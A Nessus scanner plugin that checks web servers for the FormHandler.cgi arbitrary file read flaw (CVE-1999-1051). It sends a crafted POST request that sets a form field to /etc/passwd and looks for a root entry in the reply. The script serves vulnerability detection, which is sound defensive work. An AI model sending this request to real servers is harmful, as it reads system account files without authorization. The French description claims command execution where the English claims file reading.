#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10075);
 script_bugtraq_id(799);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-1999-1051");
 name["english"] = "FormHandler.cgi";
 name["francais"] = "FormHandler.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'FormHandler.cgi' cgi is installed. This CGI has
a well known security flaw that lets anyone read arbitrary
file with the privileges of the http daemon (root or nobody).

Solution : remove it from /.

Risk factor : High";


 desc["francais"] = "Le cgi 'FormHandler.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Attempts to read /etc/passwd";
 summary["francais"] = "Essaye de lire /etc/passwd";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl", "smtp_settings.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 domain = get_kb_item("Settings/third_party_domain");
 s = string("POST /FormHandler.cgi HTTP/1.1\r\n",
     "User-Agent: Nessus\r\n",
     "Host: ", get_host_name(), "\r\n",
     "Accept: image/gif, image/x-xbitmap, */*\r\n",
     "Accept-Language: en\r\n",
     "Content-type: application/x-www-form-urlencoded");
     
 s2 = string("realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=nessus%40",
       domain,
       "&redirect=http%3A%2F%2Fwww.",
       domain,
       "&recipient=nessus%40",
       domain,
      "\r\n\r\n");

 s3 = string(s,s2);
 
 b = http_keepalive_send_recv( port:port, data:s3);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:b))security_hole(port);
} 


